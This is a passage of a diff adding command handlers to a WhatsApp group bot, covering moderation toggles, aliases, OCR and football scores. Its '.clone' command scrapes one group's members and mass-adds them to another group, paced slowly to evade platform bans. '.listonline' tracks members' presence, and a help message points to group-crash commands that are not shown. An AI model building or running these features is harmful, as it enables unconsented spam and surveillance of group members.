+                        `   " *You may speak again.*\n     *Choose your words*\n     *wisely this time.* "`
+                    ), mentions: [unmuteTarget]
+                }, { quoted: msg });
+                break;
+            }
+
+            // --- PROTECTION TOGGLES ---
+            case ".antilink": {
+                if (!isGroup) return reply(eclipseSay("not_group"));
+                const r = await getGroupRoles(sock, from);
+                if (!msg.key.fromMe && !isDevJid(senderJid) && !r.admins.has(senderJid)) return reply(eclipseSay("only_admin"));
+                const val = parts[1]?.toLowerCase();
+                if (!["on", "off"].includes(val)) return replyBadOnOff(sock, from, msg, ".antilink");
+                setGroupSetting(from, "antilink", val === "on");
+                if (val === "on" && !r.botIsAdmin) await reply(eclipseSay("not_admin_note"));
+                await reply(buildOmegaTerminal(
+                    val === "on"
+                        ? `   ╾━━━ WARD_RAISED ━━━╼\n\n` +
+                          `   🔗  ANTILINK   →  ACTIVE\n` +
+                          `   🚫  LINKS      →  BLOCKED\n` +
+                          `   👥  SCOPE      →  NON-ADMINS\n\n` +
+                          `   " The ward has been raised.\n     No uninvited paths lead\n     into this realm. "`
+                        : `   ╾━━━ WARD_FALLEN ━━━╼\n\n` +
+                          `   🔗  ANTILINK   →  INACTIVE\n` +
+                          `   ✅  LINKS      →  ALLOWED\n\n` +
+                          `   " The ward has fallen.\n     The paths are open again. "`
+                ));
+                break;
+            }
+
+            case ".antispam": {
+                if (!isGroup) return reply(eclipseSay("not_group"));
+                const r = await getGroupRoles(sock, from);
+                if (!msg.key.fromMe && !isDevJid(senderJid) && !r.admins.has(senderJid)) return reply(eclipseSay("only_admin"));
+                const val = parts[1]?.toLowerCase();
+                if (!["on", "off"].includes(val)) return replyBadOnOff(sock, from, msg, ".antispam");
+                setGroupSetting(from, "antispam", val === "on");
+                if (val === "on" && !r.botIsAdmin) await reply(eclipseSay("not_admin_note"));
+                await reply(buildOmegaTerminal(
+                    val === "on"
+                        ? `   ∷∷∷ SILENCE_GUARD — ACTIVE ∷∷∷\n\n` +
+                          `   🛡️  ANTISPAM   →  ON\n` +
+                          `   🚫  RAPID MSGS →  BLOCKED\n\n` +
+                          `   " The silence guard wakes.\n     It watches every pulse\n     of message traffic. "`
+                        : `   ∷∷∷ SILENCE_GUARD — DORMANT ∷∷∷\n\n` +
+                          `   🛡️  ANTISPAM   →  OFF\n` +
+                          `   ✅  MESSAGES   →  UNRESTRICTED\n\n` +
+                          `   " The guard sleeps.\n     Use it wisely. "`
+                ));
+                break;
+            }
+
+            case ".antimention": {
+                if (!isGroup) return reply(eclipseSay("not_group"));
+                const r = await getGroupRoles(sock, from);
+                if (!msg.key.fromMe && !isDevJid(senderJid) && !r.admins.has(senderJid)) return reply(eclipseSay("only_admin"));
+                const val = parts[1]?.toLowerCase();
+                if (!["on", "off"].includes(val)) return replyBadOnOff(sock, from, msg, ".antimention");
+                setGroupSetting(from, "antimention", val === "on");
+                if (val === "on" && !r.botIsAdmin) await reply(eclipseSay("not_admin_note"));
+                await reply(buildOmegaTerminal(
+                    val === "on"
+                        ? `   〔 MENTION_SHIELD — SEALED 〕\n\n` +
+                          `   👁️  ANTIMENTION →  ACTIVE\n` +
+                          `   🚫  MASS TAGS   →  BLOCKED\n\n` +
+                          `   " The silence holds.\n     Mass mentions will be\n     erased before they land. "`
+                        : `   〔 MENTION_SHIELD — OPEN 〕\n\n` +
+                          `   👁️  ANTIMENTION →  INACTIVE\n` +
+                          `   ✅  MASS TAGS   →  ALLOWED\n\n` +
+                          `   " The silence breaks. "`
+                ));
+                break;
+            }
+
+            case ".antidemote": {
+                if (!isGroup) return reply(eclipseSay("not_group"));
+                const r = await getGroupRoles(sock, from);
+                if (!msg.key.fromMe && !isDevJid(senderJid) && !r.admins.has(senderJid)) return reply(eclipseSay("only_admin"));
+                const val = parts[1]?.toLowerCase();
+                if (!["on", "off"].includes(val)) return replyBadOnOff(sock, from, msg, ".antidemote");
+                setGroupSetting(from, "antidemote", val === "on");
+                if (val === "on" && !r.botIsAdmin) await reply(eclipseSay("not_admin_note"));
+                await reply(buildOmegaTerminal(
+                    val === "on"
+                        ? `   ▓▓▓ THRONE_SEALED ▓▓▓\n\n` +
+                          `   👑  ANTIDEMOTE  →  ACTIVE\n` +
+                          `   🔒  BOT ADMIN   →  PROTECTED\n\n` +
+                          `   " The throne is sealed.\n     No unauthorised hand\n     may touch the crown. "`
+                        : `   ▓▓▓ THRONE_OPEN ▓▓▓\n\n` +
+                          `   👑  ANTIDEMOTE  →  INACTIVE\n` +
+                          `   🔓  BOT ADMIN   →  UNGUARDED\n\n` +
+                          `   " The throne is open.\n     Re-enable when needed. "`
+                ));
+                break;
+            }
+
+            case ".antibug":
+            case ".bugshield": {
+                if (!msg.key.fromMe && !isSelfChat) return reply("❌ Owner only.");
+                const val = parts[1]?.toLowerCase();
+                const current = getBotSecurity(botJid, "antibug");
+                if (!val || val === "status") {
+                    return reply(
+                        `🛡️ *Shield Status: ${current ? "✅ ACTIVE" : "❌ INACTIVE"}*\n\n` +
+                        `Usage:\n` +
+                        `• *.antibug on* — activate protection\n` +
+                        `• *.antibug off* — deactivate\n` +
+                        `• *.antibug status* — check state`
+                    );
+                }
+                if (!["on", "off"].includes(val)) return reply("Usage: .antibug on/off/status");
+                setBotSecurity(botJid, "antibug", val === "on");
+                await reply(`🛡️ Shield is now *${val === "on" ? "✅ ACTIVE" : "❌ INACTIVE"}*.`);
+                break;
+            }
+
+            case ".welcome": {
+                if (!isGroup) return reply(eclipseSay("not_group"));
+                const val = parts[1]?.toLowerCase();
+                if (!["on", "off"].includes(val)) return replyBadOnOff(sock, from, msg, ".welcome");
+                setGroupSetting(from, "welcome", val === "on");
+                await reply(buildOmegaTerminal(
+                    val === "on"
+                        ? `   ░▒▓ THRESHOLD_GREETS ▓▒░\n\n` +
+                          `   🚪  WELCOME MSG  →  ACTIVE\n` +
+                          `   ✨  NEW MEMBERS  →  GREETED\n\n` +
+                          `   " The threshold greets.\n     Every new soul that\n     crosses will be seen. "`
+                        : `   ░▒▓ THRESHOLD_SILENT ▓▒░\n\n` +
+                          `   🚪  WELCOME MSG  →  INACTIVE\n` +
+                          `   🔇  NEW MEMBERS  →  SILENT ENTRY\n\n` +
+                          `   " The threshold is silent.\n     New arrivals pass\n     unannounced. "`
+                ));
+                break;
+            }
+
+            case ".goodbye": {
+                if (!isGroup) return reply(eclipseSay("not_group"));
+                const val = parts[1]?.toLowerCase();
+                if (!["on", "off"].includes(val)) return replyBadOnOff(sock, from, msg, ".goodbye");
+                setGroupSetting(from, "goodbye", val === "on");
+                await reply(buildOmegaTerminal(
+                    val === "on"
+                        ? `   ░▒▓ FAREWELL_PROTOCOL ▓▒░\n\n` +
+                          `   🚪  GOODBYE MSG  →  ACTIVE\n` +
+                          `   👋  DEPARTURES   →  NOTED\n\n` +
+                          `   " Farewells will be spoken.\n     Every departure leaves\n     a mark on the void. "`
+                        : `   ░▒▓ FAREWELL_SILENCED ▓▒░\n\n` +
+                          `   🚪  GOODBYE MSG  →  INACTIVE\n` +
+                          `   🔇  DEPARTURES   →  UNANNOUNCED\n\n` +
+                          `   " Farewells silenced.\n     They leave without\n     a sound. "`
+                ));
+                break;
+            }
+
+            // --- GC CLONE ---
+            case ".clone": {
+                // Usage: .clone <source-link-or-id> <dest-link-or-id> <per-batch> <interval-mins>
+                const sourceInput = parts[1];
+                const destInput = parts[2];
+                const batchSize = parseInt(parts[3]) || 1;
+                const intervalMins = parseInt(parts[4]) || 10;
+
+                if (!sourceInput || !destInput) {
+                    return reply(
+                        `❓ *How to use .clone:*\n\n` +
+                        `*.clone* <source> <dest> <per-batch> <every-X-mins>\n\n` +
+                        `*Source/Dest can be:*\n` +
+                        `• A group invite link (chat.whatsapp.com/...)\n` +
+                        `• A group ID (from *.groupid* command)\n\n` +
+                        `*Examples:*\n` +
+                        `• _.clone link1 link2 1 10_ — 1 person every 10 mins\n` +
+                        `• _.clone 123@g.us 456@g.us 2 5_ — 2 people every 5 mins\n\n` +
+                        `✅ You can start this command from self-chat or any group.\n` +
+                        `⚠️ Source members only show if the linked WhatsApp account can access that source group.\n\n` +
+                        `_Tip: Keep it slow to avoid WhatsApp banning the group._`
+                    );
+                }
+
+                if (cloneJobs[from]) {
+                    return reply("⚠️ A clone job is already running.\n\nUse *.stopclone* to stop it first.");
+                }
+
+                if (batchSize < 1 || batchSize > 10) return reply("❌ Batch size must be between 1 and 10.");
+                if (intervalMins < 1 || intervalMins > 60) return reply("❌ Interval must be between 1 and 60 minutes.");
+
+                await reply("⏳ Fetching members from source group...");
+
+                try {
+                    // Resolve source (link or group ID)
+                    let sourceInfo, members;
+                    if (sourceInput.endsWith("@g.us")) {
+                        try {
+                            sourceInfo = await sock.groupMetadata(sourceInput);
+                            members = (sourceInfo.participants || []).map(p => p.id);
+                        } catch (e) {
+                            return reply(`❌ Could not read source group.\n\nMake sure the linked WhatsApp number is a member of that group.\n\nReason: ${e?.message || "unknown"}`);
+                        }
+                    } else {
+                        const sourceCode = sourceInput.split("chat.whatsapp.com/")[1]?.split(/[?# ]/)[0]?.trim();
+                        if (!sourceCode) return reply("❌ Invalid source link. It must look like: https://chat.whatsapp.com/XXXX");
+                        let inviteInfo;
+                        try {
+                            inviteInfo = await sock.groupGetInviteInfo(sourceCode);
+                        } catch (e) {
+                            return reply(`❌ Could not read the source invite link.\n\nThe link may be expired or invalid.\n\nTip: Use the group ID instead — run *.groupid* inside the source group and use that.\n\nReason: ${e?.message || "unknown"}`);
+                        }
+                        // Try to get members from the group (only works if bot is already in it)
+                        try {
+                            sourceInfo = await sock.groupMetadata(inviteInfo.id);
+                            members = (sourceInfo.participants || []).map(p => p.id);
+                        } catch {
+                            return reply("❌ Got the group info but can't read its members.\n\nWhatsApp only shares the member list with accounts that are *already inside* the group.\n\n✅ Fix: Join the group with your linked number first, then use its Group ID (*.groupid* command) instead of the link.");
+                        }
+                    }
+
+                    if (!members.length) {
+                        return reply("❌ No members found in the source group.\n\nThe linked WhatsApp account must be *inside* the source group to read its members. Use *.groupid* inside the group to get the ID, then try again.");
+                    }
+
+                    // Resolve destination (link or group ID)
+                    let destJid;
+                    if (destInput.endsWith("@g.us")) {
+                        destJid = destInput;
+                    } else {
+                        const destCode = destInput.split("chat.whatsapp.com/")[1]?.split(/[?# ]/)[0]?.trim();
+                        if (!destCode) return reply("❌ Invalid destination link. It must look like: https://chat.whatsapp.com/XXXX");
+                        try {
+                            const destInfo = await sock.groupGetInviteInfo(destCode);
+                            destJid = destInfo.id;
+                        } catch (e) {
+                            return reply(`❌ Could not read the destination group link.\n\nThe link may be expired or invalid.\n\nReason: ${e?.message || "unknown"}`);
+                        }
+                    }
+
+                    if (!destJid) return reply("❌ Could not access the destination group. Make sure the link is valid.");
+
+                    // Pre-flight: linked WA number must be IN destination AND admin
+                    let destInfo;
+                    try {
+                        destInfo = await sock.groupMetadata(destJid);
+                    } catch (e) {
+                        return reply(`❌ Could not read destination group.\n\nThe linked WhatsApp number must be *inside* the destination group.\n\nReason: ${e?.message || "unknown"}`);
+                    }
+                    // Build all possible JIDs the bot could appear as in participants
+                    const botJids = [];
+                    if (sock.user?.id) botJids.push(sock.user.id);
+                    if (sock.user?.lid) botJids.push(sock.user.lid);
+                    const botBaseNum = jidLocal(sock.user?.id || "");
+                    if (botBaseNum) botJids.push(botBaseNum + "@s.whatsapp.net");
+
+                    const meInDest = (destInfo.participants || []).find(p =>
+                        botJids.some(bj => isSameUser(bj, p.id))
+                    );
+                    if (!meInDest) {
+                        return reply(`❌ The linked WhatsApp number is *not in the destination group* (${destInfo.subject || destJid}).\n\nFix: join that group first, then make yourself admin, then re-run *.clone*.`);
+                    }
+                    if (!meInDest.admin) {
+                        return reply(`❌ You're in the destination group but *not an admin*.\n\nOnly admins can add members. Make yourself admin in *${destInfo.subject || "that group"}* first, then re-run *.clone*.`);
+                    }
+
+                    const totalBatches = Math.ceil(members.length / batchSize);
+                    const estTime = totalBatches * intervalMins;
+
+                    await reply(buildOmegaTerminal(
+                        `   ╔══ *MIRROR_PROTOCOL* ══╗\n\n` +
+                        `      📂 *SOURCE* : ${sourceInfo.subject}\n` +
+                        `      📂 *TARGET* : ${destInfo.subject || "ready"}\n` +
+                        `      👥 *VESSELS* : ${members.length} FOUND\n` +
+                        `      ⚡ *BATCH* : ${batchSize}/cycle\n` +
+                        `      ⏱️ *INTERVAL* : every ${intervalMins}min\n` +
+                        `      📊 *EST_TIME* : ~${estTime}min\n` +
+                        `      ♻️ *STATUS* : REPLICATING...\n\n` +
+                        `   ╚═══════════════════════╝\n\n` +
+                        `   _Use .stopclone to halt anytime._\n\n` +
+                        `   " *Why have one when you*\n     *can have two? I am*\n     *copying the very essence*\n     *of this congregation.* "`
+                    ));
+
+                    const intervalMs = intervalMins * 60 * 1000;
+                    cloneJobs[from] = { timer: null, members, total: members.length, index: 0, added: 0, skipped: 0 };
+
+                    // Sequential batching: next batch timer only starts AFTER current batch fully completes.
+                    // This prevents concurrent WA operations that cause session logouts.
+                    const runCloneBatch = async () => {
+                        if (!sock.user?.id) { delete cloneJobs[from]; return; }
+                        const job = cloneJobs[from];
+                        if (!job) return; // stopped mid-run
+
+                        if (job.index >= job.total) {
+                            delete cloneJobs[from];
+                            try {
+                                await sock.sendMessage(from, {
+                                    text: `🎉 *Clone complete!*\n\n✅ Added: *${job.added}* member(s)\n⏭ Skipped: *${job.skipped}*`
+                                });
+                            } catch (_) {}
+                            return;
+                        }
+
+                        // Process exactly batchSize members — all errors/skips are silent
+                        const thisBatch = Math.min(batchSize, job.total - job.index);
+                        for (let i = 0; i < thisBatch; i++) {
+                            if (!cloneJobs[from]) return; // .stopclone / .cancelexec fired mid-batch
+                            const memberJid = job.members[job.index];
+                            job.index++;
+                            try {
+                                const res = await sock.groupParticipantsUpdate(destJid, [memberJid], "add");
+                                const r   = Array.isArray(res) ? res[0] : null;
+                                const status = r?.status ? String(r.status) : "200";
+                                if (status === "200") {
+                                    job.added++;
+                                    await sock.sendMessage(from, {
+                                        text: `➕ Added (${job.added}/${job.total}): @${memberJid.split("@")[0]}`,
+                                        mentions: [memberJid],
+                                    });
+                                } else {
+                                    job.skipped++;
+                                }
+                            } catch (e) {
+                                job.skipped++;
+                                const errMsg = String(e?.message || "").toLowerCase();
+                                if (errMsg.includes("rate") || errMsg.includes("429") || errMsg.includes("too many")) {
+                                    await new Promise(r => setTimeout(r, 8000));
+                                }
+                            }
+                            if (i < thisBatch - 1) await new Promise(r => setTimeout(r, 1000));
+                        }
+
+                        // Schedule next batch ONLY after this batch finishes
+                        if (cloneJobs[from]) {
+                            cloneJobs[from].timer = setTimeout(runCloneBatch, intervalMs);
+                        }
+                    };
+
+                    // First batch fires after first interval
+                    cloneJobs[from].timer = setTimeout(runCloneBatch, intervalMs);
+                } catch (err) {
+                    console.error("Clone error:", err?.message || err);
+                    await reply(`❌ Failed to start clone.\n\nCheck that both links/IDs are valid, the linked account can access the source group, and the bot is admin in the destination.\n\nReason: ${err?.message || "unknown error"}`);
+                }
+                break;
+            }
+
+            case ".clonestatus": {
+                const csJob = cloneJobs[from];
+                if (!csJob) return reply("ℹ️ No active clone job in this chat.");
+                const csDone = csJob.index || 0;
+                const csTotal = csJob.total || 0;
+                const csPct = csTotal ? Math.round((csDone / csTotal) * 100) : 0;
+                await reply(
+                    `📊 *Clone Status*\n\n` +
+                    `Progress: *${csDone}/${csTotal}* (${csPct}%)\n` +
+                    `✅ Added: *${csJob.added || 0}*\n` +
+                    `⏭ Skipped: *${csJob.skipped || 0}*\n` +
+                    `⏸ Remaining: *${Math.max(0, csTotal - csDone)}*`
+                );
+                break;
+            }
+
+            case ".stopclone": {
+                const job = cloneJobs[from];
+                if (!job) return reply("⚠️ No active clone job in this chat.");
+                if (job.timer) clearTimeout(job.timer);
+                const done    = job.index || 0;
+                const total   = job.total || 0;
+                const added   = job.added || 0;
+                const skipped = job.skipped || 0;
+                const remaining = Math.max(0, total - done);
+                const pct = total ? Math.round((done / total) * 100) : 0;
+                delete cloneJobs[from];
+                await reply(
+                    `🛑 *Clone stopped.*\n\n` +
+                    `processed: *${done}/${total}* (${pct}%)\n` +
+                    `✅ added: *${added}*\n` +
+                    `⏸ remaining: *${remaining}*`
+                );
+                break;
+            }
+
+            case ".cancelexec": {
+                if (!msg.key.fromMe && !isDevJid(senderJid)) {
+                    return reply(buildOmegaTerminal(`   🔒  *ACCESS_DENIED*\n\n   dev only.`));
+                }
+                const sessKey = `${senderJid}::${from}`;
+                const hadSession = !!sessionCmdState[sessKey];
+                delete sessionCmdState[sessKey];
+
+                // Also stop any active clone job in this chat
+                const cloneJob = cloneJobs[from];
+                const hadClone = !!cloneJob;
+                if (cloneJob) {
+                    if (cloneJob.timer) clearTimeout(cloneJob.timer);
+                    delete cloneJobs[from];
+                }
+
+                if (!hadSession && !hadClone) {
+                    return reply(buildOmegaTerminal(`   ℹ️  *NOTHING_RUNNING*\n\n   No active session job or clone job found in this chat.`));
+                }
+
+                const parts2 = [];
+                if (hadSession) parts2.push("📋 Session job cancelled.");
+                if (hadClone)   parts2.push(`🛑 Clone job cancelled (added *${cloneJob.added || 0}* before stop).`);
+                await reply(buildOmegaTerminal(`   ✅  *EXEC_CANCELLED*\n\n   ${parts2.join("\n   ")}`));
+                break;
+            }
+
+            // --- HIDETAG (standalone, no text after command) ---
+            case ".hidetag": {
+                if (!isGroup) return reply("This command only works in groups.");
+                try {
+                    const meta = await sock.groupMetadata(from);
+                    const members = meta.participants.map(p => p.id);
+                    // Text after .hidetag on the same line
+                    const inlineText = parts.slice(1).join(" ").trim();
+                    const invisibleText = inlineText || '\u200e';
+                    await sock.sendMessage(from, {
+                        text: invisibleText,
+                        mentions: members,
+                    }, { quoted: msg });
+                } catch (e) {
+                    await reply(`❌ Failed to hidetag: ${e?.message || "error"}`);
+                }
+                break;
+            }
+
+            // --- TAGALL ---
+            case ".tagall": {
+                if (!isGroup) return reply("This command only works in groups.");
+                try {
+                    const meta = await sock.groupMetadata(from);
+                    const members = meta.participants.map(p => p.id);
+                    const customText = parts.slice(1).join(" ").trim();
+                    const tagText = members.map(j => `@${j.split("@")[0]}`).join(" ");
+                    const fullText = customText ? `${customText}\n\n${tagText}` : tagText;
+                    await sock.sendMessage(from, {
+                        text: fullText,
+                        mentions: members,
+                    }, { quoted: msg });
+                } catch (e) {
+                    await reply(`❌ Failed to tagall: ${e?.message || "error"}`);
+                }
+                break;
+            }
+
+            case ".tagadmin":
+            case ".admins": {
+                if (!isGroup) return reply("This command only works in groups.");
+                try {
+                    const meta = await sock.groupMetadata(from);
+                    const admins = meta.participants.filter(p => p.admin).map(p => p.id);
+                    if (!admins.length) return reply("No admins found.");
+                    const customText = parts.slice(1).join(" ").trim();
+                    const tagText = admins.map(j => `@${j.split("@")[0]}`).join(" ");
+                    await sock.sendMessage(from, {
+                        text: customText ? `👑 *Admins*\n${customText}\n\n${tagText}` : `👑 *Group Admins*\n\n${tagText}`,
+                        mentions: admins,
+                    }, { quoted: msg });
+                } catch (e) {
+                    await reply(`❌ Failed to tag admins: ${e?.message || "error"}`);
+                }
+                break;
+            }
+
+            // --- READMORE ---
+            // Note: .readmore is also intercepted BEFORE this switch (above) so it works
+            // even when .readmore appears mid-sentence like "Everyone send acc .readmore link here"
+            case ".readmore": {
+                // Reaching here means the user typed only ".readmore" with nothing before/after
+                await reply(
+                    `❓ *How to use .readmore:*\n\n` +
+                    `Put *.readmore* between the visible text and the hidden text.\n\n` +
+                    `*Example:*\n` +
+                    `_Everyone send acc .readmore Link: wa.me/xxx_\n\n` +
+                    `Group members will see *"Everyone send acc"* and tap *Read more* to see the rest.\n\n` +
+                    `_You can type it anywhere in the sentence — not just at the start._`
+                );
+                break;
+            }
+
+            // --- GROUP ID / GROUP LIST ---
+            case ".groupid": {
+                if (isGroup) {
+                    const gName = groupNames[from] || "Unknown Group";
+                    await reply(`🆔 *Group Name:* ${gName}\n*Group ID:*\n\`${from}\``);
+                } else {
+                    const knownGroups = Object.entries(groupNames);
+                    if (!knownGroups.length) return reply(`📋 No groups cached yet.\n\nRun *.groupid* inside any group first, or wait for the bot to receive a message from a group.`);
+                    let listTxt = `📋 *All Known Groups (${knownGroups.length})*\n━━━━━━━━━━━━━━━━━━━\n\n`;
+                    knownGroups.forEach(([jid, name], i) => {
+                        listTxt += `*${i+1}.* ${name}\n\`${jid}\`\n\n`;
+                    });
+                    listTxt += `_Use the Group ID above with .groupcrash, .ungroupcrash etc._`;
+                    await reply(listTxt);
+                }
+                break;
+            }
+
+            // --- AUTO-REACT ---
+            case ".autoreact": {
+                if (!isGroup) return reply("This command only works in groups.");
+                const val = parts[1]?.toLowerCase();
+                const reactData = loadAutoReact();
+                if (!val || val === "off") {
+                    delete reactData[from];
+                    saveAutoReact(reactData);
+                    return reply("❌ Auto-react turned *OFF* for this group.");
+                }
+                if (val === "on" || val === "random") {
+                    reactData[from] = "random";
+                    saveAutoReact(reactData);
+                    return reply("✅ Auto-react turned *ON* for this group. Bot will react with random emojis.");
+                }
+                // Specific emoji
+                reactData[from] = val;
+                saveAutoReact(reactData);
+                await reply(`✅ Auto-react set to *${val}* for this group.`);
+                break;
+            }
+
+            // --- AUTO-REPLY ---
+            case ".autoreply": {
+                const sub = parts[1]?.toLowerCase();
+                const replyData = loadAutoReply();
+                if (sub === "list") {
+                    const entries = Object.entries(replyData);
+                    if (!entries.length) return reply("📭 No auto-reply keywords set yet.");
+                    const list = entries.map(([k, v]) => `• *${k}* → ${v}`).join("\n");
+                    return reply(`📋 *Auto-Reply Keywords:*\n\n${list}`);
+                }
+                if (sub === "add") {
+                    const rest = parts.slice(2).join(" ");
+                    const sepIdx = rest.indexOf("|");
+                    if (sepIdx === -1) return reply("Usage: .autoreply add <keyword> | <reply text>");
+                    const keyword = rest.slice(0, sepIdx).trim().toLowerCase();
+                    const replyText = rest.slice(sepIdx + 1).trim();
+                    if (!keyword || !replyText) return reply("Usage: .autoreply add <keyword> | <reply text>");
+                    replyData[keyword] = replyText;
+                    saveAutoReply(replyData);
+                    return reply(`✅ Auto-reply added:\n*"${keyword}"* → ${replyText}`);
+                }
+                if (sub === "remove") {
+                    const keyword = parts.slice(2).join(" ").trim().toLowerCase();
+                    if (!replyData[keyword]) return reply(`❌ Keyword "*${keyword}*" not found.`);
+                    delete replyData[keyword];
+                    saveAutoReply(replyData);
+                    return reply(`🗑️ Auto-reply for *"${keyword}"* removed.`);
+                }
+                await reply(
+                    `📖 *Auto-Reply Usage:*\n\n` +
+                    `• *.autoreply add* <keyword> | <reply> — Add a keyword reply\n` +
+                    `• *.autoreply remove* <keyword> — Remove a keyword\n` +
+                    `• *.autoreply list* — Show all keywords\n\n` +
+                    `_Example:_ .autoreply add hello | Hello there! 👋`
+                );
+                break;
+            }
+
+            // --- SET ALIAS ---
+            case ".setalias": {
+                if (parts.length < 3) return reply("Usage: .setalias <trigger> <.command>\nExample: .setalias hi .menu");
+                const trigger = parts[1].toLowerCase();
+                const target = parts[2].toLowerCase();
+                const aliasData = loadAliases();
+                aliasData[trigger] = target;
+                saveAliases(aliasData);
+                await reply(`✅ Alias set: *${trigger}* → *${target}*\nNow typing *${trigger}* will run *${target}*.`);
+                break;
+            }
+
+            case ".delalias": {
+                if (!parts[1]) return reply("Usage: .delalias <trigger>");
+                const trigger = parts[1].toLowerCase();
+                const aliasData = loadAliases();
+                if (!aliasData[trigger]) return reply(`❌ Alias *${trigger}* not found.`);
+                delete aliasData[trigger];
+                saveAliases(aliasData);
+                await reply(`🗑️ Alias *${trigger}* deleted.`);
+                break;
+            }
+
+            case ".aliases": {
+                const aliasData = loadAliases();
+                const entries = Object.entries(aliasData);
+                if (!entries.length) return reply("📭 No aliases set yet.\n\nUse .setalias <trigger> <.command> to add one.");
+                const list = entries.map(([k, v]) => `• *${k}* → ${v}`).join("\n");
+                await reply(`📋 *Command Aliases:*\n\n${list}`);
+                break;
+            }
+
+            // --- OCR (extract text from image) ---
+            case ".ocr": {
+                const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
+                const quotedType = quoted ? getContentType(quoted) : null;
+                if (!quoted || quotedType !== "imageMessage") {
+                    return reply("📸 Reply to an image with *.ocr* to extract the text from it.\n\n✍️ Supports printed *and* handwritten text!");
+                }
+                await reply("🔍 Extracting text from image... (supports handwriting ✍️)");
+                try {
+                    const fakeMsg = { ...msg, message: quoted };
+                    const buf = await downloadMediaMessage(fakeMsg, "buffer", {}, { logger: pino({ level: "silent" }) });
+                    const mimeType = quoted?.imageMessage?.mimetype || "image/jpeg";
+                    const text = await ocrFromBuffer(buf, mimeType);
+                    if (!text) return reply("❌ No text found in the image.");
+                    await reply(`📝 *Extracted Text:*\n\n${text}`);
+                } catch (e) {
+                    await reply(`❌ OCR failed: ${e?.message || "error"}`);
+                }
+                break;
+            }
+
+            // --- LIST ONLINE / OFFLINE ---
+            case ".listonline":
+            case ".listoffline": {
+                const targetInput = parts[1];
+                let targetJid = from;
+                if (targetInput) {
+                    try { targetJid = await resolveGroupJid(sock, targetInput); } catch (e) {
+                        return reply(`❌ ${e.message}`);
+                    }
+                } else if (!isGroup) {
+                    return reply("Usage: .listonline [group link or ID] (or use inside the group)");
+                }
+                await reply("🔍 Checking presence... this takes ~8 seconds.");
+                try {
+                    const meta = await sock.groupMetadata(targetJid);
+                    const members = meta.participants.map(p => p.id).slice(0, 50);
+                    for (const jid of members) {
+                        try { await sock.presenceSubscribe(jid); } catch (_) {}
+                    }
+                    await delay(8000);
+                    const online = members.filter(j => ["available", "composing", "recording"].includes(presenceTracker[j]));
+                    const offline = members.filter(j => !online.includes(j));
+                    if (cmd === ".listonline") {
+                        const list = online.length ? online.map(j => `• +${j.split("@")[0]}`).join("\n") : "None detected online";
+                        await reply(`🟢 *Online Members — ${meta.subject}*\n\n${list}\n\n_Note: Presence detection is approximate._`);
+                    } else {
+                        const list = offline.length ? offline.map(j => `• +${j.split("@")[0]}`).join("\n") : "All members appear online";
+                        await reply(`🔴 *Offline Members — ${meta.subject}*\n\n${list}\n\n_Note: Presence detection is approximate._`);
+                    }
+                } catch (e) {
+                    await reply(`❌ Failed: ${e?.message || "error"}`);
+                }
+                break;
+            }
+
+            // --- FOOTBALL COMMANDS ---
+            case ".pltable": {
+                await reply("⏳ Fetching Premier League table...");
+                try { await reply(await getPLTable()); } catch (e) { await reply(`❌ Could not fetch table: ${e?.message}`); }
+                break;
+            }
+
+            case ".live": {
+                await reply("⏳ Fetching live scores...");
+                try { await reply(await getLiveScores()); } catch (e) { await reply(`❌ Could not fetch scores: ${e?.message}`); }
+                break;
+            }
+
+            case ".fixtures": {
+                const team = parts.slice(1).join(" ").trim();
+                if (!team) return reply("Usage: .fixtures <club name>\nExample: .fixtures Liverpool");
+                await reply(`⏳ Fetching fixtures for *${team}*...`);
+                try {
+                    const result = await getClubFixtures(team);
+                    if (!result) return reply(`❌ Club *${team}* not found in Premier League.`);
+                    await reply(result);
+                } catch (e) { await reply(`❌ Error: ${e?.message}`); }
+                break;
+            }
+
+            case ".fnews": {
+                const team = parts.slice(1).join(" ").trim();
+                if (!team) return reply("Usage: .fnews <club name>\nExample: .fnews Arsenal");
+                await reply(`⏳ Fetching news for *${team}*...`);
+                try {
+                    const result = await getClubNews(team);
+                    if (!result) return reply(`❌ Club *${team}* not found in Premier League.`);
+                    await reply(result);
+                } catch (e) { await reply(`❌ Error: ${e?.message}`); }
+                break;
+            }
+
+            case ".football": {
+                const team = parts.slice(1).join(" ").trim();
+                if (!team) {
+                    return reply(
+                        `⚽ *Premier League Commands:*\n\n` +
+                        `• *.pltable* — PL standings table\n` +
+                        `• *.live* — Live/today's PL scores\n` +
+                        `• *.plweek* — This week's PL matches\n` +
+                        `• *.fixtures <club>* — Club fixtures & results\n` +
+                        `• *.fnews <club>* — Club latest news\n` +
+                        `• *.football <club>* — Club full overview\n` +
+                        `• *.h2h <club1> vs <club2>* — Head-to-head history\n\n` +
+                        `_Example: .football Chelsea_\n` +
+                        `_Example: .h2h Arsenal vs Liverpool_`
+                    );
+                }
+                await reply(`⏳ Fetching info for *${team}*...`);
+                try {
+                    const [fixtures, news] = await Promise.allSettled([getClubFixtures(team), getClubNews(team)]);
+                    const fx = fixtures.status === "fulfilled" ? fixtures.value : null;
+                    const nw = news.status === "fulfilled" ? news.value : null;
+                    if (!fx && !nw) return reply(`❌ Club *${team}* not found in Premier League. Try the full name (e.g. "Manchester United").`);
+                    if (fx) await reply(fx);
+                    if (nw) await reply(nw);
+                } catch (e) { await reply(`❌ Error: ${e?.message}`); }
+                break;
+            }
+
+            case ".plweek": {
+                await reply("⏳ Fetching this week's Premier League matches...");
+                try { await reply(await getPLWeekMatches()); }
+                catch (e) { await reply(`❌ Could not fetch matches: ${e?.message}`); }
+                break;
+            }
+
+            case ".h2h": {
+                const h2hInput = parts.slice(1).join(" ").trim();
+                const separator = h2hInput.toLowerCase().includes(" vs ") ? " vs " : h2hInput.includes("|") ? "|" : null;
+                if (!separator) return reply(
+                    `⚽ *Head to Head*\n\nUsage: *.h2h <club1> vs <club2>*\nExample: *.h2h Chelsea vs Arsenal*\n\nShows their last match result and next upcoming fixture.`
+                );
+                const [clubA, clubB] = h2hInput.split(new RegExp(separator, "i")).map(s => s.trim());
+                if (!clubA || !clubB) return reply("❌ Please provide two club names.\nExample: .h2h Chelsea vs Arsenal");
+                await reply(`⏳ Looking up *${clubA}* vs *${clubB}*...`);
+                try {
+                    const result = await getH2H(clubA, clubB);
+                    if (result.error) return reply(`❌ ${result.error}`);
+                    await reply(result.text);
+                } catch (e) { await reply(`❌ Error: ${e?.message}`); }
+                break;
+            }
+
+            // --- VIEW ONCE (reply to a view-once message with .viewonce) ---
+            case ".viewonce": {
